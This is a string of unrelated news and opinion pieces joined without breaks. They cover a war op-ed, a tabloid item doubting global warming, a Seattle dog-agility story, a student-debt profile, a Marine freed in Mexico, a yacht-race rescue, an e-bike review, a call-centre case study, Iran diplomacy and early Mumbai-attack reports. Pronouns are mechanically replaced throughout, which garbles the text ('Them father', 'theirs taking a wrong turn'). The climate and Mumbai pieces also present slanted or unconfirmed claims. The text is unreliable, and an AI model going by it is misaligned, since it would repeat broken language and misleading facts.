And since America is more likely today, at least, than any other nation to resort to the use of force, it has a special opportunity and responsibility to think more critically before resorting to arms. In this regard the Germans have something to teach the U.S.
War should be a last resort, used only when necessary to promote essential ends. Fighting terrorism is such an end but even then war is rarely an effective means.
There should be no more wars of choice, no matter how quick and easy they are expected to be. Ease of victory is not enough to make might right. And, as we learned in both Iraq and Afghanistan, war is rarely the cakewalk that it is often advertised to be. War should not be just another policy option.
Is global warming just hot air? World temperatures have risen by just 0.29C in the last two decades
'Green' policy burdens will cost families £267 a year extra by 2030
World temperatures have remained almost stagnant in the last two decades, new figures have revealed.
Temperatures across the globe rose by around a third of a degree last year from the average of 14 degrees Celsius recorded between 1961 and 1990.
In some years, temperatures rose by just 0.29 degrees C while in others they rose by .53 degrees.
Global warming: A retreating glacier in Alaska USA. But despite alarmist theories, temperatures have barely risen in the past 20 years
The findings come as consumers feel the full force of a raft of environment policies introduced by the coalition and the previous Labour government in the name of climate change.
By 2030, ‘green' policy burdens could cost families an extra £267 a year and have already raised current energy bills by £78 annually.
The figures on global temperatures were published by Environment Minister Gregory Barker in a parliamentary answer to Tory MP Anne Main.
Mrs Main said it raised questions about whether vulnerable people should be made to make the choice between heating and eating.
They said: ‘These figures show that the cost to domestic energy bills from these policies will be significant and is a cause for concern.
‘I understand the Government is trying to mitigate the increase with the Green Deal and by encouraging people to insulate their homes.
‘However in areas like St Albans that have many listed properties, often owned by elderly people where they cannot benefit from energy efficiency schemes; mitigation may not be the answer and energy bills will rise.
Cold comfort: The news that world temperatures have risen by just 0.29C in 20 years will do little for Britons drenched by rain - with a hosepipe ban here to stay
‘I am worried that the most vulnerable in my constituency could be the hardest hit by these policies; the Government needs to take this into account if bills are to be kept down.'
The figures were unveiled as an environmental guru and maverick scientist admitted that they may have been ‘alarmist' about climate change.
James Lovelock, who warned that billions would die before the end of this century and only the Arctic would be fit for human habitation, said: ‘The problem is we don't know what the climate is doing. We thought we knew 20 years ago. That led to some alarmist books – mine included – because it looked clear-cut, but it hasn't happened.'
The 92-year-old told MSNBC in America: ‘The climate is doing its usual tricks. There's nothing much really happening yet. We were supposed to be halfway toward a frying world now. The world has not warmed up very much since the millennium. Twelve years is a reasonable time… it (the temperature) has stayed almost constant, whereas it should have been rising.'
The scientist is writing a new book in which they will say climate change is still happening, but not as quickly as they once feared.

West Seattle Blog editor
One week from tonight, you might find yourself cheering for a West Seattle dog in a televised competition that precedes the legendary Westminster Kennel Club All Breed Dog Show in New York City.
Marcia Lyons tells WSB that they and Liberty, their 4-year-old Nova Scotia Duck Tolling Retriever, are the only team from our state set to compete in the club's 3rd annual Masters Agility Championship.
After Marcia e-mailed us about Liberty, we asked if we could come meet them and see what they do. Marcia obliged, so there we were near their home on a sloped stretch of SW Juneau this morning:
In the original announcement we received from Marcia, the Agility Championship is described this way:
This event, which features some of the most talented K9 athletes in the country, will feature dogs and their handlers excitedly attacking an obstacle course of jumps, tunnels, weave poles, and more, racing against the clock. At Westminster, each dog will compete in two qualifying rounds. The ten dogs from each height class with the lowest combined scores will move on to the Championship round Saturday evening (February 13th), creating a field of 50 finalists competing for the coveted title of Westminster Kennel Club Masters Agility Champion. The Championship round will be televised on FOX Sports 1 beginning at 5:00 pm Pacific.
Liberty and Marcia also will be in the All-Breed Dog Show itself, which starts on Monday, February 15th, competing against other Nova Scotia Duck Tolling Retrievers – the smallest breed of retriever, Marcia explained. The evening finals will be that night 5-8 pm PT on CNBC and Tuesday, February 16th, same time slot, on the USA Network.

But first, next Saturday's agility competition, which starts with daytime runs before the televised evening finals. Liberty, they say, is already the fastest runner in their class, and they feel good about their chances at the championship, “as long as we run clean” – no mistakes.
Liberty is the first dog with whom she's competed; they say they're also working on “competitive obedience.”
The full schedule for the Masters Agility Championship and All-Breed Dog Show is here.
P.S. There's one way you can help: If you look at our video again, you'll notice Liberty running on a planting strip along a busy street. Marcia's backyard isn't quite big enough for proper training. They're looking for a space in West Seattle that is large enough for them to practice, especially before they take off for the competition.

At 44 years old, Nicole Jackson says they have bigger concerns than the six-figure student loan debt that has shadowed them for the last 20 years.
Jackson, a Miami, Fla.-based family law attorney, gave up on ever paying off their $186,000 federal student loan balance years ago. At $1,600 per month, their monthly loan payments eclipsed their $1,200/month mortgage and they and their husband are raising three teenage daughters.
"The way I see it, I'm already screwed," Jackson told us. "I'd rather make sure my kids are OK. Unless I start making significantly more money [my situation] is not gonna change."
With the nation struggling under a $1 trillion student debt crisis, stories like Jackson's are nothing uncommon. For the first time ever, the national student loan default rate exceeds the credit card delinquency rate, and so long as student loans remain one of the few types of debt that can't be discharged in bankruptcy, chances are the situation won't improve any time soon.
At the beginning of their story, Jackson, a native New Yorker, was one of the lucky ones. Them father, a doctor, paid for a year of their undergraduate studies, leaving them free to dodge student loans for a while. And with a well-paying job at a Manhattan law firm, they had more than enough funds to finance the rest of their undergraduate studies.
But when Jackson decided to pursue their dream of becoming an attorney at the University of Miami, it became impossible to avoid taking on debt.
"My intention was to go back to work after my first year of law school," they said. "[But] I did so poorly that I didn't think I could [keep a job at the same time]. So that's when I started borrowing money."
It was a costly decision. Jackson took out about $26,000 in federal loans for each year of law school and then another $20,000 in private loans to keep afloat while they studied for the bar exam.
They graduated in 1994 with more than $100,000 of debt. Within three years, they had one daughter, a surprise set of twins, and was earning less than $50,000 per year.
"It's always been a struggle," they said. "I worked for the state of Florida most of my [career] and the most I was making was $50,000/year. With three kids, it wasn't enough money."
So she, like many other borrowers, bought as much time as they could, starting by consolidating their federal student loans. Since they worked for the state, they were able to defer payments and declare financial hardship as well -- whatever it took to keep from defaulting.
"[My debt] is not going anywhere because I do not make enough money, not because I have just ignored it," they said.
"My debt is not going anywhere because I do not make enough money, not because I have just ignored it."
Them private loans took top priority. The payments were only $130/month, but since private lenders don't offer the same deferment options as federal, it was either pay or roll out the welcome mat for debt collectors.
Meanwhile, their federal loans ballooned. With an 8% interest rate, they appreciated even after they consolidated, growing from a principal balance of about $80,000 in 1994 to $186,000 today. Other than their home and a car payment, it's the only debt they carry to this day.
Eventually, their debt drove them back to New York, where they moved their family and took a lucrative job at a Manhattan law firm. They were finally able to start making federal loan payments, but the move took a toll on their family life.
"I was making six figures, working 13/14-hour days, and my kids were sad because I wasn't around," they said. "I wanted the money but I didn't want my kids to be miserable. They were babies."
After two years, they packed up and headed back to Miami, where Jackson continued plugging away on whatever legal cases came their way. Exhausted with state work, they started their own firm in 2008 with the hope that she'd earn more and could finally begin chipping away at my loans.
Last year, they were able to enroll in an income-based repayment plan for their federal loan, a perk that private lenders don't offer. Them monthly payments were reduced to $74, though the prospect of paying $74/month on a $186,000 debt hasn't exactly made the burden seem any lighter.
For now, they have their eyes on their future -- namely, their daughters' futures. Them eldest will be in college in 2015, and Jackson devoted their savings to establish a prepaid college savings plan for all three of their kids.
"I've stressed to my daughter the importance of not borrowing any money. If they don't get a scholarship or there's money that needs to be found somewhere, I'll borrow it myself and I'll deal with it before I let her," they said. "I don't want my kids going into life with this over their heads."
Story highlights Marine would have won case if it went to judgment, their attorney says
Sgt. Andrew Paul Tahmooressi and their mother reunite with "big smiles" and long hug
They were arrested in Tijuana, Mexico, on March 31
Tahmooressi served in Afghanistan and suffered from PTSD, their mother says
U.S. Marine reservist Sgt. Andrew Paul Tahmooressi is enjoying their first day home Saturday in Miami, freed from a seven-month detention in Mexico in a weapons case that they claimed grew merely from theirs taking a wrong turn.
Their jailing drew widespread attention because they and their mother made an emotional plea for their release, echoed by such public figures as former New Mexico Gov. Bill Richardson and television host Montel Williams, both of whom pressured Mexican officials on Tahmooressi's behalf.
The Marine who served in Afghanistan said they were being wrongly prosecuted and was suffering post-traumatic stress disorder.
"I think he's thrilled," family spokesperson Jonathan Franks told CNN on Saturday morning.
"It's setting in. They need a little bit of time to reconnect as a family," Franks said.
A big, long hug

Tahmooressi boarded a flight from San Diego late Friday, shortly after their release.
"It is with an overwhelming and humbling feeling of relief that we confirm that Andrew was released today after spending 214 days in Mexican jail," their relatives said in a statement.
It was an emotional reunion with "big smiles" and a big, lengthy hug between Tahmooressi and their mother when they saw each other Friday evening.
"Without question, it was one of the most powerful experiences of my life," Franks said, who was present for the mother-son reunion. "Everybody was very excited."
"These are people who guided by deep faith, and they're grateful. I'm not sure how much more eloquently you can put it," Franks said.
Tahmooressi is in good physical condition, Franks said. "Obviously they haven't spent a lot of time outside. They haven't had much access to a gym as they had in their prior life, but they look great," Franks said.
The Marine doesn't bear any "ill will" toward Mexico, Franks added.
Making 'the right choice'
Tahmooressi and their mother weren't making public comments Saturday.
"After a while, they will speak for himself," Franks said. "I think it's going to be several days, some time next week."
Richardson said they were among those who pressed for Tahmooressi's release, and they visited the former Marine at Mexico's El Hongo federal prison last week.
"I think the Mexican judge made the right choice ... because of PTSD, on humanitarian grounds, (that) they should be released," Richardson told CNN on Saturday morning.
"He's a good young man," Richardson said. "He served two tours in Afghanistan. He's suffered enough."
State Department spokesperson Jen Psaki said many U.S. officials and some Congress members worked through the Mexican legal process on behalf of Tahmooressi.
"We are pleased Mexican judicial authorities ordered Sgt. Tahmooressi released on October 31," Psaki said.
Mexican Embassy: Respecting the law
Mexican officials said "the legal process was carried out in strict accordance with the applicable legal framework and with full respect for the rights and guarantees of the U.S. citizen," the Mexican Embassy said in a statement.
"During the time of their detention, they received medical care and (accommodations) were made for them to receive personal visits," the embassy said. "The Government of Mexico reiterates its commitment to fully respect the rule of law as well as the human rights of all those within its jurisdiction. That includes the right of foreign citizens to consular notification and access, as well as guarantees of due process."
Tahmooressi was held on weapons charges after their arrest March 31 at a checkpoint in Tijuana, Mexico.
At the time, Mexican customs agents found three firearms in their truck, including a .45-caliber pistol, a pump shotgun and an AR-15 rifle. Mexico has strict federal laws on bringing weapons into the country.
Since their arrest, Tahmooressi has maintained that they took a wrong turn on the California side of the border and accidentally crossed into Tijuana.
The Mexican court said it found no cause to prosecute them on charges of carrying two firearms used exclusively by the military, possessing cartridges used exclusively by the military and carrying a firearm without a license
It also recommended they be treated for post-traumatic stress disorder.
Some Mexicans' criticism
Some Mexican nationals, however, criticized Tahmooressi and said it was no accident they were caught with guns in Mexico.
Fernando Benitez, an attorney for Tahmooressi, acknowledged how "in any country there will be some very specific sectors of society that will be a little extreme in their views."
"Mexico's not an exception," Benitez told CNN. "However, most people that really got to know the workings of the case agreed that this young man has to come back home."
If the case went to trial, Benitez felt Tahmooressi would have won, the attorney said.
"You know, it was a complicated case, but it wasn't -- never felt we couldn't win it," Benitez said.
On Monday, Benitez will try to reclaim the Marine's truck and weapons, said the lawyer who's based in Tijuana, Mexico.
Mother pleaded for release
In May, their mother said they served with the Marines in Afghanistan, and had moved to the San Ysidro, California, area to get treatment for post-traumatic stress disorder.
"He has unresolved, or untreated PTSD, and they cannot get the cognitive therapy behavior that veterans of America receive ... in a Mexico jail, where there is no such thing," Jill Tahmooressi said earlier this year.
Paul Tahmooressi has described a suicide attempt by their son with a shattered light bulb after being punched, slapped, cursed at, deprived of water and food, and shackled to a bed with a four-point restraint.
Conditions improved after media coverage of their plight, they said.
Mexican prison authorities have denied the abuse allegations.

A British man was rescued from the Pacific Ocean in the early hours of this morning after falling overboard during the Clipper Round the World Yacht Race. Derry~Londonderry~Doire crew member, Andrew Taylor (46) from London went over the side at 00.43 BST last night in rough weather and was sighted again at 01.55 BST before being recovered at approx. 02.13 BST this morning (13.13 local time, 30 March).
The incident happened in rough weather with 35 knots of wind and clear visibility, during a sail change in daylight on day 14 of Race 10 in the 16 stage Clipper Race which is currently heading for San Francisco, USA from Qingdao, China.
The yacht's professional Skipper Sean McCarter (32) from Derry Londonderry reported that they were working with Andrew on a sail change near the bow when they went over the side. Sean immediately went back to the helm, stopped the yacht and initiated the MOB (man overboard) procedure.
Race Director Justin Taylor explained: “In these conditions a man overboard is swept away from the boat very quickly and visual contact can be lost in the swell. We have a well-rehearsed procedure to mark the position, stop racing and engaged the engine to search for and recover the crew member as quickly as possible.
“An hour and a half is a very long time to be in the water in these conditions but a combination of their sea survival training and seven months at sea as well as wearing a life jacket and dry suit will have contributed enormously to their survival.”
Nearly 4,000 people have taken part in the event which includes an extensive pre-race training programme and the organisers are fully committed to safety and maintaining their excellent record.
“The sea can be a harsh environment and we rehearse every eventuality including a man overboard (MOB),” stated Clipper Race founder and chairperson Sir Robin Knox-Johnston. “The MOB procedures were put into practice flawlessly by the crew in difficult conditions. It is a tribute to their training and determination that Andrew was successfully recovered. It is always a concern when we have a major incident and we will want to analyse the circumstances in detail to see if there is anything we need to learn or review as a result.”
Following their recovery, Andrew was taken below decks for treatment by the onboard medic, crew member Susie Redhouse (42) also from London, who is a paramedic clinical tutor. They report they are suffering from shock and may have hypothermia. Their condition is being monitored closely, but they appear to be in relatively good spirits and is talking with fellow crew members.
A competing team in the fleet of twelve identical 70-foot ocean racing yachts OneDLL responded to the mayday call and diverted course to render assistance as the closest yacht to Derry~Londonderry~Doire. Falmouth and US Coast Guard services were contacted and have now been stood down. Both boats have resumed racing.
This is only the fourth ever incident in the Clipper Race's eighteen year history that someone has had to be recovered from the water. In both previous incidents, the crew members were recovered within minutes.
Sea safety is a fundamental practice of the Clipper Race. Before joining their boats all crew members must complete an extensive, four stage sailing and sea safety training course, including sea survival. This includes highly detailed instruction and practice of man overboard (MOB) procedure. All yachts are equipped with special MOB dummies and regularly rehearse search and recovery practice throughout the race.
The Pacific leg, between China and the US, is the tenth of sixteen stages which comprise the world's longest ocean race at more than 40,000 miles. The fleet is just over the half way stage of the 5,600 mile race to San Francisco. The first boats are expected to finish under the iconic Golden Gate Bridge on 11 April. The Clipper 2013-14 Race left London on 1 September 2013 and returns to St Katharine Docks next to Tower Bridge on Saturday 12 July 2014.

Background
The 40,000 mile Clipper 2013-14 Round the World Yacht Race began in London, UK on September 1 for the fleet of twelve identical Tony Castro designed Clipper 70s.
Eleven teams started the 5,600 mile leg from Qingdao, China to San Francisco, USA on March 16. PSP Logistics started the leg on March 19, a result of their late arrival into China due to several setbacks.
All twelve teams are expected in San Francisco between April 8-12, subject to prevailing conditions. The fleet will be berthed at South Beach Yacht Club until the April 19 start of Race 11 to the Panama Canal.
The race route includes Rio de Janeiro, Brazil; Cape Town, South Africa; Albany, Sydney, Hobart and Brisbane, Australia; Singapore; Qingdao, China; San Francisco, USA; Panama; Jamaica; New York, USA; Derry-Londonderry, Ireland; and Den Helder, Netherlands before returning to London in July.

My affection for the weekday bicycle commute is inversely proportional to the grade of the next hill. Don't get me wrong, I find cycling for sake of cycling — putting on the stretchy racing bibs and clicky shoes to go tackle endless climbs — a pure joy. But when the ride into the office requires a shower and wardrobe change, my laziness and vanity usually win out, so I end up just taking the bus.

Electric bikes seem like a brilliant solution, as they can help you zip up hills and across flats without all the huffing and puffing. But the e-bike has proven a tough nut to crack, as evidenced by the dearth of electric bicycles that are practical in all the important ways: appropriate power, easy and fast charging, intuitive controls, manageable weight and supreme comfort in the saddle. Some come close, but then fail on aesthetics — nobody wants to be seen on something that resembles a Huffy with a giant silver box welded to the back of the frame.
The motor and battery are almost entirely invisible at first glance, hidden away inside the frame.
The designers of the Faraday Porteur have nailed the elusive important bits by prioritizing the e-bike's bicycle-ness. The motor and battery are almost entirely invisible at first glance, hidden away inside the frame. And actually, the electric power boost is a secondary feature that, rightfully, stays dormant until topographic desperation makes you hit the switch. Until then, it's a comfortable cruiser that looks like it was pulled straight from a rack on Amsterdam's hippest street corner.
The Porteur is the result of an award-winning design from the Oregon Manifest, a competition that challenged builders to create the ultimate utility bike. Adam Vollmer, an IDEO designer and alum of Stanford and MIT, led a team that spent months tweaking the design until the entire package fit into a beautiful retro cruiser. Now, they've got a Kickstarter campaign, and the team is taking pre-orders for bikes at $3,500 a pop. Yes, that's expensive, but people are willing to pay: The funding round ends on Aug. 9, and the team is already well past its $100,000 goal — $141,000 as of this writing.
Before even considering the motor, it's a fancy ride. A Brooks B17 saddle is standard. The front platform for hauling cargo is interchangeable, and the support for it is mounted to the frame instead of the handlebars, which makes for easier turning under load. A Swiss-made scissor kickstand folds down from the bottom bracket, and lightweight bamboo fenders keep water off your ass. The brakes are Avid mechanical disks, and the transmission is an eight-speed Shimano Alfine internally geared hub, so there's no derailleur to get gummed up by sand, gravel, or road slush.
The electronics are deliberately hidden from sight. Filling the cavities in the dual top tubes is a 110Wh battery array with a claimed lifespan of about five years. It powers a 250-watt motor located in the front wheel — it's designed to operate as a two-wheel-drive system, meaning your quads power the back wheel.
A cigarette-pack-sized, weatherproof collection of chips and wires tucked under the seat serves as the brains of the drivetrain. After measuring the pedal speed and wheel speed with magnetic sensors, the system calculates how much boost to give. The engineer who designed it accounted for every thread of wire inside, ensuring that, unlike the clunky power units you see on other motorized bikes, the electric power remains hidden. It's a feat of streamlined design.
At first, you feel the motor only a little bit, then the power starts to increase smoothly. Even starting from a standstill, the boost gets you up to top speed with hardly any effort.
To feel the electricity in action, flick the thumb switch on the left grip to turn on the “pedal assist.” Once initiated, the bike begins to feel weightless, like you're being pushed by a strong tailwind. But you have to keep pedaling. The idea is to provide a supplementary boost in the face of an incline. You still have to pedal, but the boost makes a huge difference. At first, you feel the motor only a little bit, then the power starts to increase smoothly. Even starting from a standstill, the boost gets you up to top speed with hardly any effort. It's damn hard to keep from grinning.
The electric drive system does have a weird glitch. It only happens when you significantly increase the amount of torque you're putting into pedals — like when you get up out of the saddle at the beginning of a steep hill. When you do this with the power boost on, you get these brief, intermittent gaps in pedal resistance. You're pushing really hard, and then the resistance disappears and the pedals spin freely for a split second (a feeling akin to when you miss the last step on a staircase and your foot just drops). Then you get resistance again, then another sudden drop, then resistance.
Most of the time, the power creeps in smoothly and there are no glitches. So if you're a get-up-and-grind type of rider, this odd resistance drop requires you to recalibrate your riding style — when you're starting a hill, you just need to find the correct gear and cadence to continue pedaling smoothly, rather than resorting to standing up out of the saddle. There's a trick to it, but I wasn't able to master it by the end of my hour-long test ride around downtown Palo Alto.
It is clear the designers haven't stopped at the novelty of an electric motor, and have instead built a bike that's primarily a convenient and comfortable utility machine. After a 45-minute charge from a standard outlet, the batteries will give you about 10 to 15 miles of power, more if you turn the assist off while coasting. That's plenty for city rides. When darkness falls, the hidden light sensors turn on the integrated rear LED and the twin one-watt LEDs in the front, which are exceptionally bright and, unlike accessory lighting, really hard to steal. If your trip to the farmers market requires a subway ride to get home, the Porteur weighs in at just under 40 pounds, which means you can haul it up and down stairs without too much struggle.
After a 45-minute charge from a standard outlet, the batteries will give you about 10 to 15 miles of power.
The bike comes with two leather-wrapped charging cords, and a leather pouch on the top tube for your leather-encased iPhone and vintage leather wallet.
If you went to the Kickstarter page and ordered a Porteur right now, you'd pay $3,500. When the bikes are delivered in mid-2013, they will sell to new customers at retail for $3,800, a $300 bump. For the amount of electronic inventiveness and quality materials integrated into this gorgeous package, the $3,800 price feels about right. But of course, the value depends equally on the gnarliness of your town's topography and how you see a bicycle fitting into your life.
This electric motor, to me, solves the issues that dissuade me from bicycling around San Francisco. I live at the top of a steep hill and I sweat easily. I usually arrive at Wired with my shirt stuck to my back. I might be exceptionally thin-skinned, but those inconveniences are what keep me from making use of the city's abundant bike lanes, and getting a pleasant bit of exercise in the morning. The Porteur makes the bicycle a more realistic method of transportation for me.
One final note: If the Kickstarter backing reaches $300,000, Faraday will develop an app that, via Bluetooth connectivity, lets users adjust the pedal assist according to their riding strength and the difficulty of their commute. That funding level seems unlikely with only a week left, but it's something to look forward to eventually if you're already a backer.

The Client
The Client is the world's third largest business software company. It has branches in over 30 countries and offers a full range of enterprise business software including:
Customer relationship management
Enterprise asset management
Enterprise resource planning
Financial management
Human capital management
Performance management
Product lifecycle management
Supplier relationship management
Supply chain management, including business specific inventory management, transportation logistics and warehouse management software
The Client's goal is to provide the best software experience and a lower total cost of ownership for their customers. To meet customers' long-term needs, they provide an evolutionary path to support continuing business and technology innovation.
The Challenge
The Client didn't have the in-house expertise to run a lead generation and lead management campaign, nor did they have the database tools to support one. To achieve their objectives, they needed a partner to develop and execute a comprehensive lead generation, qualification and appointment-setting program to capture greater market share for their business software solutions. While the company had a dominant market share in the industry, it lacked the support for their sales people to handle leads and prospect profiling.
With the rapidly increasing number of individuals from various companies across all industries downloading information from the Client's website, it was crucial for them to:
profile and qualify all individuals using their website;
strengthen their sales force capabilities in handling the profiling and qualification
Calls had to be made across the Asia Pacific Region to verify the records of individuals and companies that downloaded files from the Client's website. Qualification was necessary, as the Client wanted to ensure that their website visitors/prospects could be considered warm leads before their sales team pursued them. Aside from verification and qualification, the Client also needed a support team to call and invite prospects and customers to various company-sponsored events throughout Asia.
The Callbox Solution
The Client teamed up with Callbox to carry out:
1. Lead Generation through outbound cold calling to generate leads and appointments for the Client's sales force.
The Client's target market consisted of decision makers who were looking for business-specific solutions to address their challenges and produce tangible results. Callbox's sales force used cold calling to identify and qualify prospects for the Client. Qualifying questions determined:
Determine whether the prospects wanted to evaluate a new software solution.
Determine business pains and/or areas of interest to find a fit between prospects' needs and Client's solution offerings.
Identify the type of software prospects were using and for how long they've been using it.
Find out if prospects would be interested if presented with a new solution.
Callbox executed the cold-calling campaign using the list of target contacts provided by the Client. Agents who were assigned to this campaign used a customized spreadsheet to keep track of all call results. Calls were categorized as lead completed, not interested, competitor, invalid, duplicate, no action needed, etc., and were assigned to each respective column on the spreadsheet for easy reporting and evaluation. Leads generated from the calling campaign were posted on the PipelineCRM to be reviewed by the Client and feedbacks were discussed. Callbox provided daily and monthly reports on pipeline activity and campaign status.
2. Profiling and updating the client's prospect data base with up-to-date business and contact information
The Client provided Callbox with their list of prospects and clients. The Callbox Team verified and updated all possible contact information by phone, including email addresses.
3. Call-to-Invite Campaigns
Callbox provided total sales and marketing support by carrying out several call-to-invite campaigns, inviting the Client's customers and prospects to attend company-sponsored events in the Philippines, Indonesia, Malaysia and Singapore. The Callbox Team then followed up every call with an email. Aside from company-sponsored events, the Client also held webinars. Callbox callers invited guests to these webinars and also confirmed attendance for the Client.
4. Online, web-based reporting across all aspects of the project, its progress, and statistics which included lead distribution and appointments set.
The Callbox solution provided the Client with a steady, predictable flow of qualified sales opportunities as well as a systematic methodology for tracking every opportunity and evaluating sales force effectiveness.
The Client has a very accurate and predictable sales pipeline. By the time the prospect was ready to truly engage with them, they already had complete information about their prospects and their companies.
The Results
With the Callbox Team averaging 2000 calls monthly, verifying contact information of current customers, qualifying prospective clients, and setting appointments for the Client's sales team, the Client experienced a significant increase in conversion rates.
Backed by Callbox's own PipelineCRM, the Client enjoyed easy tracking and monitoring of all leads. The Client was also able to consistently improve service offerings through call recordings made available by Callbox.
Since then, the Client has been renewing on a month-to-month basis with new campaigns — lead generation, call-to-invite and profiling for different types of products. Pleased with the overall performance of Callbox, the Client provides sales training for the team, conducted at the start of every campaign. The smooth integration of sales and marketing with disciplined lead management resulted in increased sales and also provided total control over the customer acquisition process.
I had another set of negotiations with Iranian diplomats when I was ambassador to Iraq in 2007. The goal was to persuade Iran to cease supporting groups like Moqtada al-Sadr's Mahdi army, a Shiite militia that was targeting the Iraqi government and coalition forces. Unlike the Afghan negotiations, these talks took place in the full glare of the media, rendering the give-and-take of effective diplomacy impossible. While the negotiations accomplished nothing, they may have convinced Iraqi Prime Minister Nuri Kamal al-Maliki that their only option for dealing with the militias was military force. They launched a military operation against them in April 2008. In fighting that extended from Baghdad to Basra, the government eventually prevailed, with substantial coalition support.
The Afghan experience demonstrates that diplomatic progress between the United States and Iran is possible. It is certainly not guaranteed, but a solid diplomatic solution is always better than the alternatives.
The government of the Islamic Republic is clearly an adversary, but it is also a rational actor. And, like all governments, it is capable of being pragmatic and flexible when it is in its interest to do so. There is a chance that the Obama administration can replicate past successes if it applies four lessons from the 2001 talks.
First, American negotiators must understand that serious progress is likely to come only in direct talks between the United States and Iran. The involvement of the permanent members of the United Nations Security Council and Germany should continue, but the heavy lifting will have to be done by the two central actors.
Second, the substance of the talks must be closely held. Revealing the details too soon will give ammunition to those who oppose the talks and limit the flexibility of the negotiators.
Third, America should be ready to introduce other issues beyond the nuclear file. Progress in one area can build confidence and facilitate progress in others. I mentioned this in a discussion with Iranian leaders in New York last month and they seemed receptive, mentioning Afghanistan and Syria as possibilities.
Finally, the United States must make clear that we do not seek to overthrow the Iranian regime. Iranian paranoia on this issue is virtually limitless and understandably so. In 1953, the American and British intelligence services ousted a democratically elected Iranian prime minister, an episode that very few Americans remember and no Iranian will ever forget.
Mumbai Massacre Carried Out By Brits
By By Jerry Lawton, Emma Wall and Gemma Wheatley
November 29, 2008 "The Daily Star" -- -- Police from the UK and India are probing claims that up to seven of the assassins, whose victims included a 13-year-old girl, travelled from the UK.
Indian security forces said at least two of the captured terrorists were British-born Pakistanis, while the total number could be as many as seven. In a sick twist, they are thought to have possible links to Yorkshire towns where the 7/7 outrages were plotted.
Last night UK police were using hi-tech computer software to link images of up to 25 gunmen to known Islamic fanatics.
The men were captured with eight others after commandos stormed two hotels and a Jewish centre to free hostages in the Indian finance capital.
A senior security official said: “There is mounting concern about the extent of British involvement in the attacks.
“Images of some of the gunmen are being studied in a bid to identify them. We are trying to see if this appalling event had roots in the UK.”
Prime Minister Gordon Brown said it was “too early” to reach any conclusions.
They added: “At no point has the Prime Minister of India suggested to me there is evidence at this stage of any terrorist of British origins, but obviously these are huge investigations that are being done.”
The developments put Leeds back in the terror spotlight. Two of the 7/7 suicide bombers – Shehzad Tanweer, 22, and Hasib Hussain, 18 – hailed from the city, while plot mastermind Mohammad Sidique Khan, 30, lived in nearby Dewsbury. Their 2005 attacks left 52 dead and 700 injured.
A previously unknown Islamic group, Deccan Mujahideen, has claimed responsibility for the Mumbai attacks but terror experts believe this could be a cover to mask links to al-Qaida.
A source at Counterterrorism North confirmed they were probing possible links, but said they had “no specific information” linking suspects to the UK. However, dozens of Brit-born Pakistanis have travelled to the country to train in terror camps in recent years.
The security source added: “The camps in Pakistan are full and many inside are Brits.”
Meanwhile, it emerged yesterday that the Mumbai attackers killed a 13-year-old girl in cold blood as they cowered in a café with their dad.
American Naomi Scherr and their father Alan, 58, from Virginia, died as militants stormed the Oberoi-Trident hotel. They were on a spiritual trip to the city.
In all, 24 corpses were found at the Oberoi as the seige ended with the deaths of two gunmen. Dozens of hostages, including Brits and several European air crews, were freed from the Oberoi after a 41-hour ordeal.
One of the victims there was the sister of Bollywood actor Ashish Chowdhary, who wept as they heard the news.
Meanwhile, at the other targeted five-star hotel, the Taj Mahal, several terrorists were still holed up last night. And troops tracking them down said they had seen up to 50 blood-spattered bodies in the building.
It was also revealed that the England cricket team – who were meant to have been staying at the ravaged Taj Mahal hotel – could have been a target. The team only escaped after a last-minute decision to go to Bangalore.
Former captain Michael Vaughan, 34, said: “It was only at the last minute that our training camp was switched.
“We could have been in one of those hotels when it was attacked. All our kit is at the Taj Mahal. That's how close the danger is.”
Reports said some of the terrorists at the hotels had posed as workers and tourists, so could continue their attacks when civilians had been herded to “safety”.
We told yesterday how Brit millionaire Andreas Liveras, 73, died in the carnage, when militants attacked 10 targets.
Last night it was feared more Brits' bodies could be found and official sources said the overall death toll could top 200.
One focus of the destruction was the headquarters of an ultra-Orthodox Jewish group, Chabad-Lubavitch.
When troops blasted their way into the building they found five hostages had been killed, including Rabbi Gavriel Holtzberg, 29, and their wife Rivka, 28.
Their 18-month-old son Moshe was smuggled out of the centre by a worker.
A senior Indian police official told how the baby-faced terrorists, who arrived in Mumbai by sea, looked young but were “very determined and remorseless” and had been trained to kill.
“They were wearing T-shirts, just ordinary-looking, but they had definitely been trained to use weapons.”
Last night India's foreign minister blamed Pakistanis for the attacks, but that was denied by officials there. Click on "comments" below to read or post comments Comment (0) Comment Guidelines

I just received my eagerly-anticipated copy of the 2012 WRTH directly from the publisher and, as ever, jumped right into their articles and reviews.
Like many radio listeners, I always look forward to the newest edition of the WRTH. It takes its rightful place at arm's length next to my main receiver. Even though I use online frequency guides, I find they generally lack the detail and foresight that WRTH delivers. And much more than just a listing of frequencies, WRTH's radio reviews, feature articles, and HF report make for excellent reading.
On that note–this year, WRTH reviews several noteworthy shortwave receivers: the Alinco DX-R8E (the European version of the DX-R8T which we reviewed), the Reuter Elektronic RDR54C, WinRadio Excalibur Pro, Sangean ATS-909X and the Tecsun PL-660. They also take a look at the very affordable Pappradio DRM SDR receiver. The WRTH review mix always covers the receiver spectrum, from portables to professional, tabletops to SDRs.
The 2012 WRTH edition also gives a simple primer on the terminology and techniques used for evaluating receiver performance–e.g., sensitivity, selectivity, dynamic range, etc.–a worthy reference for anyone who routinely reads radio reviews.
I always enjoy their human-interest articles as well. In this edition they take us to the remote–I should say, most remote–Atlantic island, Tristan da Cunha; report on radio's involvement (or lack of it) in the “Arab Spring;” and visit our good friends at Radio Bulgaria.
But, of course, the reason we all buy WRTH is for their in-depth comprehensive radio schedules for the upcoming year. How comprehensive are they? Check out the results from the annual comparative analysis of WRTH vs competitor guide Klingenfuss at the end of this post. Personally I can't do without my WRTH–as I've often said, this indispensable go-to reference guide is the source for my shortwave listening fare.
Purchase your copy of WRTH directly from WRTH's publishers, or from a distributor like Universal Radio (US) or Radio HF (Canada).
If you're new to WRTH, note that they regularly update changes to their schedules throughout the year: go to their website to download these updates.
If you would like to know more about using WRTH's schedules, please see one of our previous posts.
How does WRTH compare with other frequency listings? Sean Gilbert posted the following on WRTH's Facebook page:
The annual comparative analysis of WRTH vs Klingenfuss has just been published. I am pleased to announce that, once again, WRTH has proved more accurate and comprehensive than the Super Frequency List as regards Shortwave broadcasting (which is the area this study concentrates on). Overall we scored 98.4%, compared to the SFL which scored 97.6%. Breaking this down out of a possible 125 points for international broadcasting, we scored 124, whereas SFL scored 120. For domestic broadcasting, WRTH scored 122/125 and SFL scored 124/125, so the SFL just has the edge. This is caused by WRTH not including the full schedule for some of the tropical band stations in SAm. Here is a comment extracted from the report:
——-
